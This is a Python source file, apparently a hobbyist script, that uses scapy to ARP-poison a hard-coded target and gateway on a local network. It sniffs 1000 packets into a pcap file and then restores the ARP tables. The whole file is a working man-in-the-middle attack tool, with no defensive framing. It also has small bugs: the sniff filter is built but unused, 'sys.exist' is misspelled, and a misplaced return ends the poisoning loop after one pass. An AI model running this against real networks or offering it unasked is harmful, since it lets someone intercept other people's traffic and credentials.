from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

INTERFACE       =   'eth0' #your interface
TARGET_IP       =   '192.168.1.107'
GATEWAY_IP      =   '192.168.1.1' #gateway address
PACKET_COUNT    =   1000

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print '[*] Restoring targets...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)
def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    while 1:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print 'ARP poison attack finished.'
        return

if __name__ == '__main__':
    conf.iface = INTERFACE
    conf.verb = 0
    
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if GATEWAY_MAC is None:
        print "[-] Failed "
        sys.exit(0)
    else:
        print " Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC)

    TARGET_MAC = get_mac(TARGET_IP)
    if TARGET_MAC is None:
        print "[-] Failed ."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC)

    poison_thread = threading.Thread(target = poison_target, args=(GATEWAY_IP, GATEWAY_MAC, \
        TARGET_IP, TARGET_MAC))
    poison_thread.start()

    try:
       
        bpf_filter = 'IP host ' + TARGET_IP
        packets = sniff(count=PACKET_COUNT, iface=INTERFACE)
        wrpcap('results.pcap', packets) #save madi
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)

    except Scapy_Exception as msg:
        print msg, "Fucked up code!!"

    except KeyboardInterrupt:
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
        sys.exist()